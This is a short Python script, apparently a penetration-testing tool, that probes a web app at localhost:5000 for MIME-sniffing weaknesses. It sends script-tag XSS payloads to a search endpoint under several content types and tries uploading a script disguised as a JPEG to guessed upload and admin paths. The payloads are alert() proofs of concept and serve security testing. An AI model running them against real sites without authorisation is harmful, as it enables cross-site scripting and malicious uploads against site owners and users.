import requests
from bs4 import BeautifulSoup
import time
import sys

class MimeSniffingTester:
    def __init__(self, target_url="http://localhost:5000"):
        self.target_url = target_url
        self.session = requests.Session()
    
    def test_content_injection(self):
        print("[*] Testing MIME-type sniffing vulnerability...")
        
        # Test payloads with different content types
        payloads = {
            'text/plain': '<script>alert("XSS via text/plain")</script>',
            'image/jpeg': '<script>alert("XSS via image/jpeg")</script>',
            'application/json': '<script>alert("XSS via application/json")</script>'
        }
        
        for content_type, payload in payloads.items():
            print(f"\n[+] Testing with Content-Type: {content_type}")
            
            # Custom headers to exploit MIME sniffing
            headers = {
                'Content-Type': content_type,
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            try:
                # Try to inject via search endpoint
                response = self.session.post(
                    f"{self.target_url}/search",
                    data={'q': payload},
                    headers=headers
                )
                
                print(f"Status Code: {response.status_code}")
                print("Response Headers:")
                for header, value in response.headers.items():
                    print(f"  {header}: {value}")
                
                # Check if X-Content-Type-Options is present
                if 'X-Content-Type-Options' not in response.headers:
                    print("\n[!] Vulnerable: X-Content-Type-Options header is missing!")
                    print("    Browser may execute injected content despite Content-Type")
                
            except requests.exceptions.RequestException as e:
                print(f"Error during request: {e}")
    
    def test_file_upload_mime(self):
        """Simulate file upload with incorrect MIME type"""
        print("\n[*] Testing file upload MIME sniffing...")
        
        # Create a malicious file with mixed content
        files = {
            'file': ('innocent.jpg', '<script>alert("Malicious Upload")</script>', 'image/jpeg')
        }
        
        try:
            # Attempt to upload to any available endpoint
            endpoints = ['/upload', '/post/new', '/admin/upload']
            for endpoint in endpoints:
                response = self.session.post(
                    f"{self.target_url}{endpoint}",
                    files=files
                )
                print(f"Tried endpoint {endpoint}: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error during upload test: {e}")

def main():
    tester = MimeSniffingTester()
    tester.test_content_injection()
    tester.test_file_upload_mime()

if __name__ == "__main__":
    main()
